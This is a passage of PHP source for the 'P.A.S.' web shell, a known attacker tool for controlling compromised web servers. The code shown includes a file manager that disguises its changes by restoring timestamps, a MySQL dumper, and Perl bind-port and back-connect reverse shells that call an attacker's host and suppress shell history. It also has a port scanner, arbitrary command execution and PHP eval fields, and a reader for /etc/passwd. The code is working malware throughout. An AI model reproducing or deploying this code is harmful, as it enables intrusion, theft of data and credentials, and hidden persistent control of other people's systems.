				$_POST['fef'] = $_POST['fn'];
			} else sm('Can\'t create file. Sorry.', 'e');
		} else {
			if (@mkdir($_POST['fn'])) sm('Folder created successfully. Congratulations!', 'i');
			else sm('Can\'t create folder. Sorry.', 'e');
		}
		@touch($_POST['fn'], $s[9], $s[8]);
		@touch(dirname($_POST['fn']), $s[9], $s[8]);
	} elseif (!empty($_FILES)) {
		foreach ($_FILES['fu']['name'] as $i => $v) {
			$s = @stat($_SESSION['CP']);
			@move_uploaded_file($_FILES['fu']['tmp_name'][$i], $_SESSION['CP'] . $v);
			@touch($_SESSION['CP'] . $v, $s[9], $s[8]);
			@touch($_SESSION['CP'], $s[9], $s[8]);
		}
	}
	if (isset($_POST['fef'])) {
		?>
		<fieldset>
			<form action="" method="post" align="center"><input type="hidden" name="fe"/><input type="hidden" name="fpr"
																								value="<?php echo escHTML(str_rot13($_POST['fef']));
																								?>"/><input
					type="submit" value="Edit file"/> <input type="submit" name="ai" value="Show as image"/></form>
		</fieldset>     <?php if (@is_file($_POST['fef'])) {
			$s = @stat($_POST['fef']);
			if (isset($_POST['fefs'])) {
				if ($f = @fopen($_POST['fef'], 'w')) {
					@fwrite($f, $_POST['fefc']);
					@fclose($f);
					@touch($_POST['fef'], $s[9], $s[8]);
					sm('File successfully saved. Congratulations!', 'i');
				} else sm('Can\'t save this file. Sorry.', 'e');
			} elseif (isset($_POST['fefp'])) {
				if (@chmod($_POST['fef'], intval($_POST['fefp'], 8))) {
					@touch($_POST['fef'], $s[9], $s[8]);
					sm('File permissions successfully changed. Congratulations!', 'i');
				} else sm('Can\'t change file permissions. Sorry.', 'e');
			} elseif (isset($_POST['fefg'])) {
				if (@chgrp($_POST['fef'], $_POST['fefg'])) {
					@touch($_POST['fef'], $s[9], $s[8]);
					sm('File group successfully changed. Congratulations!', 'i');
				} else sm('Can\'t change file group. Sorry.', 'e');
			} elseif (isset($_POST['fefd'])) {
				if (@touch($_POST['fef'], @strtotime($_POST['fefd']))) sm('File modification times successfully changed. Congratulations!', 'i');
				else sm('Can\'t change file modification times. Sorry', 'e');
			}
			if (isset($_POST['ai'])) {
				echo '<center><img alt="Can\'t show as image. Sorry." src="data:image;
 base64,', base64_encode(@file_get_contents($_POST['fef'])), '"/></center>';
			} else {
				if (@is_readable($_POST['fef'])) {
					?>
					<form action="" method="post" style="padding-top:0">
					<fieldset
						style="text-align:right"><?php echo '<input type="text" value="' . escHTML($_POST['fef']) . '" style="width:', @is_writable($_POST['fef']) ? '925px" name="fef"/> <input type="submit" name="fe" value="Save"/><input type="hidden" name="fefs"/>' : '900px" readonly="readonly"/> READ ONLY';
						?></fieldset>
					<textarea name="fefc" id="s"><?php $f = @fopen($_POST['fef'], 'rb');
						while (!feof($f)) echo escHTML(fread($f, 1048576));
						@fclose($f);
						?></textarea></form><?php
				} else sm('Can\'t read this file. Sorry.', 'e');
				@clearstatcache(FALSE, $_POST['fef']);
				$s = @stat($_POST['fef']);
				?>
				<fieldset>
				<table width="100%" style="table-layout:auto;
 text-align:center">
					<tr>
						<td>
							<form action="" method="post">Perms: <input type="text" name="fefp"
																		value="<?php echo substr(sprintf('%o', @fileperms($_POST['fef'])), -5);
																		?>" style="width:55px"/> <input type="submit"
																										name="fe"
																										value="&gt;
 "/><input type="hidden" name="fpr" value="<?php echo escHTML(str_rot13($_POST['fef']));
								?>"/></form>
						</td>
						<td>
							<form action="" method="post">Group: <input type="text" name="fefg" value="<?php echo $s[5];
								?>" style="width:100px"/> <input type="submit" name="fe" value="&gt;
 "/><input type="hidden" name="fpr" value="<?php echo escHTML(str_rot13($_POST['fef']));
								?>"/></form>
						</td>
						<td>
							<form action="" method="post">Mtime (ctime: <?php echo @date('Y-m-d H:i:s', $s[10]);
								?>): <input type="text" name="fefd" value="<?php echo @date('Y-m-d H:i:s', $s[9]);
								?>" style="width:140px"/> <input type="submit" name="fe" value="&gt;
 "/><input type="hidden" name="fpr" value="<?php echo escHTML(str_rot13($_POST['fef']));
								?>"/></form>
						</td>
					</tr>
				</table></fieldset><?php
			}
		} else sm('Can\'t read this file. Sorry.', 'e');
	} else {
		$d = array('/directory1', '/dir2/subdir2', '/dir3/*/subsubdir3', 'dir4/lang-??/');
		if (IW) $d = 'c:' . implode(';
 c:', $d);
		else $d = implode(';
 ', $d);
		if (isset($_POST['fs'])) {
			if (!empty($_POST['fss'])) {
				$_POST['fst'] = 1;
				$_POST['fsr'] = 1;
			}?>
			<fieldset align="center">
			<form action="" method="post"><input type="hidden" name="fe"/>Search <select name="fsr">
					<option value="0">any</option>
					<option value="1"<?php if (isset($_POST['fsr']) && $_POST['fsr'] == 1) echo ' selected="selected"';
					?>>readable&nbsp;
					</option>
					<option value="2"<?php if (!empty($_POST['fsr']) && $_POST['fsr'] == 2) echo ' selected="selected"';
					?>>writable&nbsp;
					</option>
				</select> <select name="fst">
					<option value="0">objects&nbsp;
					</option>
					<option value="1"<?php if (!empty($_POST['fst']) && $_POST['fst'] == 1) echo ' selected="selected"';
					?>>files&nbsp;
					</option>
					<option value="2"<?php if (!empty($_POST['fst']) && $_POST['fst'] == 2) echo ' selected="selected"';
					?>>dirs&nbsp;
					</option>
				</select> with a name <input type="text" name="fsn"
											 value="<?php echo empty($_POST['fsn']) ? '*' : escHTML($_POST['fsn']);
											 ?>" title="Example: *.sql,backup*,user-01???.ftp,.htpasswd"
											 style="width:190px"/> in <input type="text" name="fsp"
																			 value="<?php echo empty($_POST['fsp']) ? escHTML($_SESSION['CP']) : escHTML($_POST['fsp']);
																			 ?>" title="Example: <?php echo $d;
				?>" style="width:440px"/> <input type="submit" name="fs" value="&gt;
 "/>

				<div style="margin-top:10px;
  text-align:center"> with text <input type="text" name="fss"
									   value="<?php if (!empty($_POST['fss'])) echo escHTML($_POST['fss']);
									   ?>" style="width:900px"/></div>
			</form></fieldset><?php
		}
		$a = array();
		function cn(&$i1, &$i2)
		{
			if ($i1[3] == 0 || $i2[3] == 0) {
				if ($i1[3] == 0 && $i1[1] == '[ .. ]') return 0;
				if ($i2[3] == 0 && $i2[1] == '[ .. ]') return 1;
				if ($i1[3] != 0 && $i2[3] == 0) return 1;
				if ($i1[3] == 0 && $i2[3] != 0) return -1;
			} elseif ($i1[2] > $i2[2]) return 1;
			elseif ($i1[2] < $i2[2]) return -1;
			return @strnatcmp($i1[1], $i2[1]);
		}

		function gs($p, &$n, &$a)
		{
			if (substr($p, -1) !== DIRECTORY_SEPARATOR) $p .= DIRECTORY_SEPARATOR;
			if (!empty($_POST['fss'])) $c = -1 * strlen($_POST['fss']);
			if ($t = @glob($p . $n, GLOB_BRACE)) foreach ($t as $v) {
				if ($_POST['fsr'] == 0 || ($_POST['fsr'] == 1 && @is_readable($v)) || ($_POST['fsr'] == 2 && @is_writable($v))) {
					if ($_POST['fst'] != 1 && empty($_POST['fss']) && @is_dir($v)) {
						$tn = bname($v);
						if ($tn != '.' && $tn != '..') $a[] = array($v, '[ ' . $v . ' ]', '', 0);
					} elseif ($_POST['fst'] != 2 && @is_file($v)) {
						if (!empty($_POST['fss'])) {
							if ($f = @fopen($v, 'rb')) {
								while (!feof($f)) {
									$s = fread($f, 1048576);
									if (stripos($s, $_POST['fss'])) {
										$a[] = array($v, $v, '', 1);
										break;
									}
									if (!feof($f)) @fseek($f, $c, SEEK_CUR);
								}
								@fclose($f);
							}
						} else $a[] = array($v, $v, '', 1);
					}
				}
			}
			if ($t = @glob($p . '*', GLOB_ONLYDIR)) foreach ($t as $v) gs($v, $n, $a);
		}

		$a = array();
		if (isset($_POST['fs'])) {
			if (isset($_POST['fsn'])) {
				$n = ($_POST['fsn'] == '*') ? '{.,}*' : '{' . $_POST['fsn'] . '}';
				$p = explode(';
 ', $_POST['fsp']);
				foreach ($p as $v) gs($v, $n, $a);
			}
		} else {
			if (@is_readable($_SESSION['CP'])) {
				$d = @opendir($_SESSION['CP']);
				while (FALSE !== ($v = @readdir($d))) {
					$p = @realpath($_SESSION['CP'] . $v);
					if (@is_dir($p)) {
						if ($v != '.') $a[] = array($p, '[ ' . $v . ' ]', '[ DIR ]', 0);
					} elseif (@is_file($p)) {
						$i = strrpos($v, '.');
						if ($i > 0) $a[] = array($p, substr($v, 0, $i), substr($v, $i + 1), 1);
						else $a[] = array($p, $v, '', 1);
					} else {
						$a[] = array($p, $v, '', 1);
					}
				}
				@closedir($d);
				@uasort($a, cn);
			}
		}
		if (!empty($a)) {
			?>
			<script>         function sv(t) {
					t.value = t.parentNode.parentNode.firstChild.firstChild.value;
				}
				function del(t) {
					if (confirm('Do you really want to delete this file?')) {
						t.value = t.parentNode.parentNode.firstChild.firstChild.value;
						return true;
					}
					return false;
				}
				function gf(t) {
					var v = document.createElement('input'), f = document.getElementById('ff');
					v.type = 'hidden';
					v.name = 'fpr';
					v.value = t.parentNode.firstChild.firstChild.value;
					f.appendChild(v);
					f.submit();
				}      </script>
			<form action="" method="post" id="ff"><input type="hidden" name="fe"/>
				<table id="listf">
					<tr>
						<th width="20px"><input type="checkbox" onclick="ca(this.checked,'ff')"/></th>
						<th>Name</th><?php if (!isset($_POST['fs'])) echo '<th width="50px">Ext</th>';
						?>
						<th width="90px">Size (kB)</th>
						<th width="<?php echo isset($_POST['fs']) ? '130' : '140';
						?>px">Modified
						</th>
						<th width="140px">Owner</th>
						<th width="55px">Perms</th>
						<th width="140px">Actions</th>
					</tr><?php foreach ($a as $n => $v) {
						$s = @stat($v[0]);
						$r = escHTML(str_rot13($v[0]));
						$i = ($v[3] == 0 && $v[1] == '[ .. ]');
						echo '<tr><td><input type="', ($i ? 'hidden' : 'checkbox"name="fc[]'), '"value="', $r, '"/>';
						echo '</td><td onclick="gf(this);
 "';
						if (!empty($_SESSION['MO'][$v[0]])) echo 'style="text-decoration:line-through"';
						elseif (!empty($_SESSION['CO'][$v[0]])) echo 'style="text-decoration:underline"';
						echo '>', escHTML($v[1]), '</td>';
						if (!isset($_POST['fs'])) echo '<td>', escHTML($v[2]), '</td>';
						echo '<td align="right">', ($v[3] == 0) ? '[ DIR ]' : @number_format($s[7] / 1024, 3, '.', ''), '</td><td align="center"';
						echo '>', @date(isset($_POST['fs']) ? 'y-m-d H:i:s' : 'Y-m-d H:i:s', $s[9]), '</td><td align="center">';
						if (PE) {
							$t = @posix_getpwuid($s[4]);
							echo $t['name'];
						} elseif (!empty($ui[$s[4]])) echo $ui[$s[4]];
						else echo $s[4];
						echo '/';
						if (PE) {
							$t = @posix_getgrgid($s[5]);
							echo $t['name'];
						} elseif (!empty($gi[$s[5]])) echo $gi[$s[5]];
						else echo $s[5];
						echo '</td><td style="text-align:center;
 ', @is_writable($v[0]) ? 'color:green' : (@is_readable($v[0]) ? '' : 'color:red'), '">', substr(sprintf('%o', @fileperms($v[0])), -5), '</td><td align="center">';
						if (!$i) {
							?>
							<button type="submit" name="fd" onclick="return del(this)">Del</button>
							<button type="submit" name="fm" onclick="sv(this)">Move</button>
							<button type="submit" name="fcf" onclick="sv(this)">Copy</button>
							<button type="submit" name="fdw" onclick="sv(this)">Get</button><?php
						}
						echo '</td></tr>';
					}?>
					<tr>
						<th colspan="4" align="left">&nbsp;
							With selected : <input type="submit" name="fda" value="Delete"
												   onclick="return confirm('Do you really want to delete selected files?')"/>
							<input type="submit" name="fma" value="Move"/> <input type="submit" name="fca"
																				  value="Copy"/> <input type="submit"
																										name="fdwa"
																										value="Download"/>
						</th>
						<th colspan="<?php echo isset($_POST['fs']) ? 3 : 4;
						?>"
							align="right"><?php if (!isset($_POST['fs']) && (!empty($_SESSION['CO']) || !empty($_SESSION['MO']))) echo 'With ', @count($_SESSION['CO']) + @count($_SESSION['MO']), ' objects in buffer : <input type="submit" name="fbc" value="Clean"/>', @is_writable($_SESSION['CP']) ? ' <input type="submit" name="fbp" value="Paste"/>' : '';
							?></th>
					</tr>
				</table>
			</form>
			<fieldset style="text-align:center">
			<form action="" method="post">Rename <input type="text" name="frs"
														value="<?php echo escHTML($_SESSION['CP']);
														?>" style="width:435px"/> to <input type="text" name="frd"
																							value="<?php echo escHTML($_SESSION['CP']);
																							?>" style="width:435px"/>
				<input type="submit" name="fe" value="&gt;
 "/></form></fieldset><?php if (@is_writable($_SESSION['CP'])) { ?>
				<fieldset style="float:left;
  width:480px;
  text-align:center">
				<form action="" method="post">Create <select name="t">
						<option value="f">file&nbsp;
						</option>
						<option value="d">dir</option>
					</select> : <input type="text" name="fn" value="<?php echo escHTML($_SESSION['CP']);
					?>" style="width:335px"/> <input type="submit" name="fe" value="&gt;
 "/></form></fieldset>
				<fieldset style="float:right;
  width:480px;
  text-align:center;
  clear:bottom">
					<form action="" method="post" enctype="multipart/form-data"><input type="file" name="fu[]" size="55"
																					   multiple="multiple"
																					   style="width:410px"/> <input
							type="submit" name="fe" value="upload"/></form>
				</fieldset><?php
			}
		} elseif (!isset($_POST['fs']) || isset($_POST['fsn'])) sm('Can\'t find any file. Sorry.', 'e');
	}
} elseif (isset($_POST['se'])) {
	$c = array('tp' => '', 'ha' => 'localhost', 'hp' => '', 'un' => '', 'up' => '', 'db' => '');
	if (isset($_POST['sc'])) $c = $_POST['sc'];
	elseif (isset($_SESSION['DB'])) $c = $_SESSION['DB'];
	if (isset($_POST['sd'])) {
		$c['db'] = $_POST['sd'];
		$c['tn'] = '';
	} elseif (isset($_POST['st'])) $c['tn'] = $_POST['st'];
	if (isset($_POST['so'])) $c['sl'] = $_POST['so'];
	if (!isset($c['tn'])) $c['tn'] = '';
	if (!isset($c['sl'])) $c['sl'] = 10;
	?>
	<fieldset>
	<form action="" method="post" align="center">Type : <select
			name="sc[tp]"><?php $t = array('mysqli' => 'MySQL');
			foreach ($t as $k => $v) if (@function_exists($k . '_connect')) {
				echo '<option value="', $k, '"';
				if ($c['tp'] == $k) echo ' selected="selected"';
				echo '>', $v, '&nbsp;
 </option>';
			}?></select> Host : <input type="text" name="sc[ha]" value="<?php echo escHTML($c['ha']);
		?>" style="width:150px"/>:<input type="text" name="sc[hp]" value="<?php echo $c['hp'];
		?>" style="width:45px"/> User : <input type="text" name="sc[un]" value="<?php echo escHTML($c['un']);
		?>" style="width:130px"/> Password : <input type="text" name="sc[up]" value="<?php echo escHTML($c['up']);
		?>" style="width:130px"/> DB : <input type="text" name="sc[db]" value="<?php echo escHTML($c['db']);
		?>" style="width:130px"/> <input type="submit" name="se" value="&gt;
 "/></form></fieldset><?php if (!empty($c['tp'])) {
		$s = new sc($c['tp']);
		if ($s->cn($c['ha'], $c['hp'], $c['un'], $c['up'])) {
			$_SESSION['DB'] = $c;
			?>
			<div style="float:left;
  margin-left:3px;
  margin-top:4px;
  width:235px;
 ">
			<form action="" method="post" id="fd"><input type="hidden" name="se"/>
			<table class="lists" id="fd">
				<tr>
					<th width="20px"><input type="checkbox" onclick="ca(this.checked, 'fd')"/></th>
					<th>Databases :</th>
				</tr><?php if ($s->ld()) {
					$i = 0;
					while ($v = $s->fv($i++)) echo '<tr><td><input type="checkbox" name="cd[]" value="', $v, '"/></td><td><input type="submit" name="sd" value="', $v, '"/></td></tr>';
				}?>
				<tr>
					<th colspan="2"><input type="submit" name="sdd" value="Dump"/></th>
				</tr>
			</table></form><?php if (!empty($c['db'])) $s->sd($c['db']);
			if (!empty($c['db']) && $r = $s->lt($c['db'])) {
				$ts = array();
				?><br/>
				<form action="" method="post" id="ft"><input type="hidden" name="se"/>
				<table class="lists">
					<tr>
						<th width="20px"><input type="checkbox" onclick="ca(this.checked, 'ft')"/></th>
						<th>[ <?php echo $c['db'];
							?> ]
						</th>
					</tr><?php $i = 0;
					while ($v = $s->fv($i++, $r)) {
						
						$ts[$v] = $s->ts($c['db'], $v);
						echo '<tr><td><input type="checkbox" name="ct[]" value="', $v, '"/></td><td><input type="submit" name="st" value="', $v, '"/><div>', $ts[$v], '</div></td></tr>';
					}?>
					<tr>
						<th colspan="2"><input type="submit" name="sdt" value="Dump"/></th>
					</tr>
				</table></form><?php } ?></div><?php if (isset($_POST['sq'])) {
				$q = $_POST['sq'];
				$c['tn'] = '';
			} elseif (!empty($c['tn'])) {
				$p = isset($_POST['sp']) ? $_POST['sp'] : 1;
				$q = $s->ql($c['db'], $c['tn'], $p, $c['sl']);
			} else $q = '';
			?>
			<div style="float:right;
  width:755px;
  margin-right:3px;
 ">
			<fieldset>
			<form action="" method="post">Query : <input type="text" name="sq" value="<?php echo escHTML($q);
				?>" style="width:650px"/> <input type="submit" name="se" value="&gt;
 "/></form></fieldset><?php if (!empty($q)) {
				if ($s->q($q)) {
					echo '<div style="overflow-x:auto;
  margin:3px;
 "><table class="listr" ><tr>';
					$i = 0;
					while ($v = $s->fn($i++)) echo '<th>', escHTML($v), '</th>';
					echo '</tr>';
					while ($v = $s->fr()) {
						echo '<tr>';
						foreach ($v as $t) echo '<td><p>', escHTML($t), '</p></td>';
						echo '</tr>';
					}
					echo '</table></div>';
					if (!empty($c['tn'])) {
						$l = ceil($ts[$c['tn']] / $c['sl']);
						if ($l > 1) {
							?>
							<fieldset class="pag">
							<table width="100%">
								<tr>
									<td>Page :
										<form action="" method="post"><input type="hidden" name="se"/><input
												type="submit" name="sp"
												value="1"/><?php if ($p > 2) echo ' <button type="submit" name="sp" value="', $p - 1, '">&lt;</button>';
											?></form>
										<form action="" method="post"><input type="hidden" name="se"/> <input
												type="text" name="sp" value="<?php echo $p;
											?>" style="width:60px"/></form>
										<form action="" method="post"><input type="hidden"
																			 name="se"/><?php if ($p < $l - 1) echo ' <button type="submit" name="sp" value="', $p + 1, '">&gt;</button>';
											?> <input type="submit" name="sp" value="<?php echo $l;
											?>"/></form>
									</td>
									<td align="right">
										<form action="" method="post">Rows per page: <select
												name="so"><?php $t = array(10, 25, 50, 100, 250, 500, 1000);
												foreach ($t as $v) {
													echo '<option value="', $v, '"';
													if ($c['sl'] == $v) echo ' selected="selected"';
													echo '>', $v, '</option>';
												}?></select> <input type="submit" name="se" value="&gt;"/></form>
									</td>
								</tr>
							</table></fieldset><?php
						}
					}
				} else sm($s->e(), 'e');
			}?></div><br style="clear:both;
 "/><?php $s->cl();
		} else {
			if (isset($_SESSION['DB'])) unset($_SESSION['DB']);
			sm("Can't connect. " . $s->e(), 'e');
		}
	}
} elseif (isset($_POST['nt'])) {
	$pf = empty($_POST['pf']) ? 0 : $_POST['pf'];
	$pl = empty($_POST['pl']) ? 65535 : $_POST['pl'];
	$sc = empty($_POST['sc']) ? 50 : $_POST['sc'];
	?>
	<div class="ntwrk">
		<fieldset>
			<legend>Bind port</legend>
			<form action="" method="post">
				<div>Port : <input type="text" name="pb" value="<?php echo empty($_POST['pb']) ? '8888' : $_POST['pb'];
					?>" style="width:42px"/>
					<button type="submit" name="nt" value="bp"/>
					&gt;
					</button></div>
			</form>
		</fieldset>
		<fieldset>
			<legend>Back-connect</legend>
			<div>
				<form action="" method="post">To : <input type="text" name="hbc"
														  value="<?php echo empty($_POST['hbc']) ? $_SERVER['REMOTE_ADDR'] : $_POST['hbc'];
														  ?>" style="width:102px"/> : <input type="text" name="pbc"
																							 value="<?php echo empty($_POST['pbc']) ? '8888' : $_POST['pbc'];
																							 ?>" style="width:41px"/>
					<button type="submit" name="nt" value="bc">&gt;
					</button>
				</form>
			</div>
		</fieldset> <?php if (@function_exists('socket_create')) { ?>
			<fieldset>
				<legend>Port scanner</legend>
				<form action="" method="post">
					<table width="100%" class="form">
						<tr>
							<td width="55px">Host :</td>
							<td colspan="2"><input type="text" name="hs"
												   value="<?php echo empty($_POST['hs']) ? 'localhost' : $_POST['hs'];
												   ?>" style="width:100%"/></td>
						</tr>
						<tr>
							<td>Ports :</td>
							<td colspan="2"><input type="text" name="pf" size="5" value="<?php echo $pf;
								?>"/> - <input type="text" name="pl" size="5" value="<?php echo $pl;
								?>"/></td>
						</tr>
						<tr>
							<td>Streams&nbsp;
								:
							</td>
							<td><input type="text" name="sc" size="4" value="<?php echo $sc;
								?>"/></td>
							<td align="right">
								<button type="submit" name="nt" value="ps">&gt;
								</button>
							</td>
						</tr>
					</table>
				</form>
			</fieldset> <?php } ?> </div>
	<div style="float:left;
  width:740px">
		<center><?php $l0 = '#!/usr/bin/perl' . "\n" . '$SIG{\'CHLD\'}=\'IGNORE\';
  use IO::Socket;
  use FileHandle;
 $o=" [OK]";
 $e="      Error: ";
 $l="\r\n-----------------------------------------\r\n";
 $h="----  ';
			$l1 = '  ----";
  print $h;
  print "\r\n> Start...";
  print "\r\n> Get protocol by name...";
 $tcp=getprotobyname("tcp") or die print "$l$e$!$l";
  print "           $o";
  ';
			$l2 = ' print "\r\n> Packed address info...";
 $sckt=sockaddr_in(';
			$l3 = ') or die print "$l$e$!$l";
  print "            $o";
  print "\r\n> Create socket...";
  socket(SOCKET, PF_INET, SOCK_STREAM,$tcp) or die print "$l$e$!$l";
  print "                  $o";
  ';
			$l4 = (IW ? '' : 'system("unset HISTFILE;
  unset SAVEHIST;
 ");
 ') . ' print "\r\n$h\r\n\r\n";
  system(' . (IW ? "'cmd.exe'" : "'/bin/sh -i'") . ');
 print "$l\r\n";
  ';
			if ($_POST['nt'] == 'bp') {
				@session_write_close();
				$tfn = ctf($l0 . ' Hello from P.A.S. Bind Port ' . $l1 . $l2 . $_POST['pb'] . ', INADDR_ANY' . $l3 . 'print "\r\n> Set socket options...";
  setsockopt(SOCKET, SOL_SOCKET, SO_REUSEADDR, 1) or die print "$l$e$!$l";
  print "             $o";
  print "\r\n> Bind socket...";
  bind(SOCKET,$sckt) or die print "$l$e$!$l";
  print "                    $o";
  print "\r\n> Listen socket...";
  listen(SOCKET, 5) or die print "$l$e$!$l";
  print "                  $o";
  print "\r\n> Accept connection...";
  accept(CONN,SOCKET) or die print "$l$e$!$l";
  print "$l      OK! I\'m accept connection.$l";
 if(!($pid=fork)){if(!defined $pid){exit(0);
 }open(STDIN, "<&CONN");
 open(STDOUT, ">&CONN");
 open(STDERR, ">&CONN");
 ' . $l4 . 'close CONN;
 }');
				echo '<pre>';
				se('perl ' . $tfn . ' 2>&1 &');
				@unlink($tfn);
				echo '</pre>';
			} elseif ($_POST['nt'] == 'bc') {
				@session_write_close();
				$tfn = ctf($l0 . 'Hello from P.A.S. BackConnect' . $l1 . 'print "\r\n> Convert host address...";
 $inet=inet_aton("' . $_POST['hbc'] . '") or die print "$l$e$!$l";
  print "           $o";
 ' . $l2 . $_POST['pbc'] . ',$inet' . $l3 . 'print "\r\n> Connect to ' . $_POST['hbc'] . ':' . $_POST['pbc'] . '...";
  connect(SOCKET,$sckt) or die print "$l$e$!$l";
  print "$l      OK! I\'m successful connected.$l";
  open(STDIN, "<&SOCKET");
 open(STDOUT, ">&SOCKET");
 open(STDERR, ">&SOCKET");
 ' . $l4);
				echo '<pre>';
				se('perl ' . $tfn . ' 2>&1 &');
				@unlink($tfn);
				echo '</pre>';
			} elseif ($_POST['nt'] == 'ps') {
				@session_write_close();
				$hi = gethostbyname($_POST['hs']);
				echo '<table border="1" class="list"><tr><th>Port</th><th>Service</th><th>Answer</th></tr>';
				for ($pf = $pf;
					 $pf <= $pl;
					 $pf += $sc + 1) {
					$ss = $sr = $sw = array();
					$scn = ($pf + $sc > $pl) ? $pl - $pf : $sc;
					for ($p = $pf;
						 $p <= ($pf + $scn);
						 $p++) {
						$sh = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
						@socket_set_option($sh, SOL_SOCKET, SO_SNDTIMEO, array('sec' => 2, 'usec' => 0));
						@socket_set_option($sh, SOL_SOCKET, SO_RCVTIMEO, array('sec' => 2, 'usec' => 0));
						@socket_set_nonblock($sh);
						@socket_connect($sh, $hi, $p);
						@socket_set_block($sh);
						usleep(10000);
						$sr[] = $sw[] = $se[] = $sh;
						$ss[$sh] = $p;
					}
					if (@socket_select($sr, $sw, $se, 2)) {
						foreach ($sw as $sn => $sh) if (!empty($ss[$sh])) {
							@socket_write($sh, "HELLO\r\n\r\n");
							$sr[] = $sh;
						}
						foreach ($sr as $sn => $sh) if (!empty($ss[$sh])) {
							$a = @socket_read($sh, 255);
							@socket_shutdown($sh, 2);
							@socket_close($sh);
							echo '<tr><td align="right">', $ss[$sh], '</td><td>', (($s = @getservbyport($ss[$sh], 'tcp')) == '' ? 'unknown' : $s), '</td><td>', nl2br(escHTML($a)), '</td></tr>';
							@flush();
							unset($sr[$sn], $ss[$sh], $sw[$sh]);
						}
						foreach ($se as $sn => $sh) if (!empty($ss[$sh])) {
							@socket_shutdown($sh, 2);
							@socket_close($sh);
							unset($se[$sn], $ss[$sh]);
						}
					}
				}
				echo '</table>';
			} else {
				?>
				<pre></pre><?php } ?></center>
	</div><br style="clear:both;
 "/><?php
}elseif (isset($_POST['sc'])) {
		@session_write_close();
		function pe($c)
		{
			@ob_start();
			$e = false;
			@eval('$e=true;
 ');
			if ($e) @eval($c);
			elseif (@function_exists('create_function')) {
				$f = @create_function('', $c);
				$f();
			} else {
				$f = ctf('<?php ' . $c . ' ?>');
				@include($f);
				@unlink($f);
			}
			echo escHTML(@ob_get_clean());
		}

		echo '<pre>';
		if (!empty($_POST['ex'])) se('(' . $_POST['ex'] . ')2>&1');
		elseif (!empty($_POST['ev'])) pe($_POST['ev']);
		echo '</pre>';
	} elseif (isset($_POST['si'])) {
		?>
		<fieldset>
		<form action="" method="post">
			<button type="submit" name="si" value="">phpinfo
			</button><?php if (!IW && @is_readable('/etc/passwd')) echo ' <button type="submit" name="si" value="p">passwd</button>';
			?></form>
		</fieldset><?php if ($_POST['si'] == 'p') echo '<pre>', @file_get_contents('/etc/passwd'), '</pre>';
		else {
			ob_start();
			phpinfo();
			$i = str_replace('<img ', '<noimg ', ob_get_clean());
			$is = substr($i, strpos($i, '<style'));
			$is = substr($is, 0, strpos($is, '</style>')) . ', p, table, th, td {font-size:12px}</style>';
			$is = str_replace(array('body', "\n", ','), array('p', ' .php ', ', .php '), $is);
			$i = substr($i, strpos($i, '<body>') + 6);
			$i = substr($i, 0, strrpos($i, '</body>'));
			echo '<div class="php">', $is, $i, '</div>';
		}
	}?>
	<fieldset style='font:normal 12px "Courier New"'>
		<form action="" method="post" style="margin-bottom:5px;
 ">Exec : <input type="text" name="ex" value="<?php echo isset($_POST['ex']) ? escHTML($_POST['ex']) : (IW ? 'ver' : 'uname -a');?>" style="width:895px;"/>
			<button type="submit" name="sc">&gt;</button>
		</form>
		<form action="" method="post" style="margin-top:5px">Eval : <input type="text" name="ev" value="<?php echo isset($_POST['ev']) ? escHTML($_POST['ev']) : 'phpinfo();';?>" style="width:895px;"/>
			<button type="submit" name="sc">&gt;</button>
		</form>
	</fieldset>
	<fieldset class="footer">
		<table width="100%" border="0">
			<tr>
				<td>P.A.S. v.3.1.6 for php 7</td>
				<td align="center">
					<form action="" method="post"><select
							name="cs"><?php $a = array('UTF-8', 'Windows-1251', 'CP-866', 'KOI8-R', 'KOI8-U', 'ISO-8859-5', 'ISO-8859-1');
							foreach ($a as $v) {
								echo '<option value="', $v, '"';
								if ($_SESSION['CS'] == $v) echo ' selected="selected"';
								echo '>', $v, '&nbsp;
 </option>';
							}?></select> <input type="submit" value="&gt;
 "/><?php if (isset($_POST['fef'])) echo '<input type="hidden" name="fe" value="1"/><input type="hidden" name="fpr" value="', escHTML(str_rot13($_POST['fef'])), '"/>';
						else {
							$e = array('fe', 'fs', 'se', 'nt', 'br', 'sc', 'si');
							foreach ($e as $i) if (isset($_POST[$i])) {
								echo '<input type="hidden" name="' . $i . '"/>';
								break;
							}
						}?></form>
				</td>
				<td align="right"><?php echo @number_format(mt() - ST, 3, '.', '');
					?> s.
				</td>
			</tr>
		</table>
	</fieldset>
</body>
</html><?php die();

?>
